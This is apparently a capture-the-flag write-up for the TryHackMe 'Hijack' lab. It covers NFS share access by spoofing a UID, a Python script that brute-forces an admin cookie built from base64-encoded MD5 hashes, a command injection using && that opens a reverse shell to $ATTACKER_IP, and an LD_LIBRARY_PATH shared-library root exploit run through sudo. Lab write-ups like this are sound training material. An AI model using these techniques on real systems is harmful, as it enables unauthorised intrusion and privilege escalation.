---
title: Hijack @ THM
date: 2023-10-24 14:37:48 +0100
categories: [Machines, THM]
tags: [Scripting, nfs]
math: true
mermaid: true
media_subpath: /assets/posts/2023-10-24-THM-Hijack
image:
  path: preview.jpeg
---

# Hijack

![8d33165f4e0c5c59dcaced020cfd29d8](https://github.com/7h30ry/writeups/assets/51336409/98b0c349-7122-4c0e-b2ae-c4b8ba838207)

## Port Scan
```
PORT      STATE SERVICE  REASON  VERSION
21/tcp    open  ftp      syn-ack vsftpd 3.0.3
22/tcp    open  ssh      syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDpnR3ykEuk2NQvQc0himxsomjasxw3O/GG4qFs6hsvMeL9Tz2XjphokcWL047dwd+nlJTunp4g3NIPNZ4fRM3Je/FhUcnOEN1r9lrqv8Nj5Z7W6ijggHOKF+TroSfIAY4lQqGj6mxH1v6x/KmaUYHeUzRc0CjiYambzDPWrMINP1Ystdzf0an4j6B019hNJqIZf0hqVE+85By1QB/2KkwHInr5NchKDDGjuORwK2aYia/y4OwtoXFN1bYEKo86ArmgPISJ1fiQvul9l8jp//LWQ6LP4CL0RazQpgVN0KYycjF9apiElB/wCbJmu46OJq+4MwAvNdZ0k9yKB851QCED
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFLpu0hiiZtLDcv/LyQ1ueZ+JwHOws+dcFw/ec/uzWAcwO26pPCBjZ8ChHD7Wucjfb8JOVVEG/BsSaAnunj7oGM=
|   256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILDB99YDzbOHshtveNLYuxSz88jXIuijXj8gyYVZx/Nn
80/tcp    open  http     syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Home
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100005  1,2,3      36465/udp   mountd
|   100005  1,2,3      37438/udp6  mountd
|   100005  1,2,3      56052/tcp   mountd
|   100005  1,2,3      59812/tcp6  mountd
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  syn-ack 2-3 (RPC #100227)
35064/tcp open  mountd   syn-ack 1-3 (RPC #100005)
35313/tcp open  mountd   syn-ack 1-3 (RPC #100005)
36432/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
56052/tcp open  mountd   syn-ack 1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

By scanning our target with Nmap, we can discover several open ports. Notable services are FTP on port 21, 
SSH on port 22, a web server on port 80, Microsoft Windows RPC on port 111,
and the NFS access control list on port 2049.

## NFS
Since there is an NFS I want to take a look at it.

```
showmount -e 10.10.148.158
Export list for 10.10.148.158:
/mnt/share *
```
So, there is a share I can mount in the following way

```
mkdir /tmp/nfsfiles
sudo mount -t nfs 10.10.148.158: /tmp/nfsfiles
```
A look at the file permissions tells me, that a user with uid 1003 created the share. 
Therefore, a user with the same uid on the local attack machine, where the share has been mounted, 
is needed to get permissions to open the directory.

```
ls -l nfsfiles/mnt/
total 4
drwx------ 2 1003 1003 4096 Aug  8 20:28 share
```
```
sudo useradd hijack -u 1003  -m -s /bin/bash
```
Now switch to the user and take a look at the inside of the share.
```
sudo su hijack

 ls -la nfsfiles/mnt/share/
total 12
drwx------ 2 hijack hijack 4096 Aug  8 20:28 .
drwxr-xr-x 3 root   root   4096 Aug  8 20:28 ..
-rwx------ 1 hijack hijack   46 Aug  8 20:28 for_employees.txt
```
```
cat nfsfiles/mnt/share/for_employees.txt

ftp creds :

ftpuser:XXXXXXXXXXXXXXXXXXXXXXXX
```
```
ftp ftpuser@10.10.148.158
Connected to 10.10.148.158.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||41574|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Aug 08 19:28 .
drwxr-xr-x    2 1002     1002         4096 Aug 08 19:28 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08 19:28 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08 19:28 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08 19:28 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08 19:28 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08 19:28 .profile
226 Directory send OK.
ftp>
```

Two files are .from_admin.txt and .password_list.txt are of special interest . The former file contains the following

```
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```
The latter is a list of random passwords the admin seems to have created earlier.

## Exploitation

At first I tried to circumvent the rate limiting, which took a lot of time and led nowhere in the end. The key is the PHPSESSID cookie, it looked a bit suspicious so I tried to decode it for the user I created on the page.
```
d2h4OmE4ZjVmMTY3ZjQ0ZjQ5NjRlNmM5OThkZWU4MjcxMTBj
```

Decoded 
```
whx:a8f5f167f44f4964e6c998dee827110c
```
That hash looked a lot like an md5 hash, so I compared it to the password I used
```bash
echo -n "asdasd" | md5sum
a8f5f167f44f4964e6c998dee827110c  -
```
After that I created a Python script to hash & encode the cookie before iterating the list and in this way I got the correct password.
```python
import hashlib
import base64
import requests

URL = "http://10.10.148.158/administration.php"

with open ("passwords_list.txt", 'r') as _f:
    data = [x.strip() for x in _f.readlines()]

r = requests.get(URL)
page_content = r.text
print(r)

for line in data:
    _hash = hashlib.md5(line.encode('utf-8')).hexdigest().encode('utf-8')
    concat_str = b'admin:' + _hash
    _b64hash = base64.b64encode(concat_str).decode()
    print(_b64hash)
    headers = { "Cookie": f"PHPSESSID={_b64hash}"}
    r = requests.get(URL, headers=headers)
    if len(r.text) > len(page_content):
        print("password: " + line)
        print("cookie: " + _b64hash)
        break
```
After login there is a Service Status Checker on the administration page. 
You can see the status of services/daemons installed on the box of the challenge through systemctl status <command>.
My first impression was to just chain commands through ; like ssh ; id, but that ended in

Most of the commonly used shells have boolean operators like && and || as a condition for the previous exit status code. 
For example in bash you can check the status code of the last command that was executed via echo $?. 
That means && is true if the previous command would return a 0 otherwise || is true and the command afterwards will be executed. 
These operators are not blocked by the page, it is possible to chain commands like this

```
sshd && bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1"
```
## Root

On the target config.php contains credentials for the user rick.

```
 cat config.php
<?php
$servername = "localhost";
$username = "rick";
$password = "XXXXXXXXXXXXXXXXXXX";
$dbname = "hijack";

// Create connection
$mysqli = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($mysqli->connect_error) {
  die("Connection failed: " . $mysqli->connect_error);
}
?>
```
So, I switched to the user using ssh rick@10.10.148.158 and got the first flag inside /home/rick/user.txt. 
One of the first things to check on gained privileges is the current user's permissions on the availability of substituting other users, usually using sudo.

```
$ python -c 'import pty;pty.spawn("/bin/bash")'
rick@Hijack:~$ id
uid=1003(rick) gid=1003(rick) groups=1003(rick)
rick@Hijack:~$ sudo -l
[sudo] password for rick: 
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
## Exploit
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
Lets compile it by using 
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC priv.c
```
Then execute the command
```
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
```
root@Hijack:/root# id
uid=0(root) gid=0(root) groups=0(root)
```
![Screenshot from 2023-10-24 14-36-42](https://github.com/7h30ry/writeups/assets/51336409/ff1438aa-e12c-40a4-b145-8495fe5168e3)


























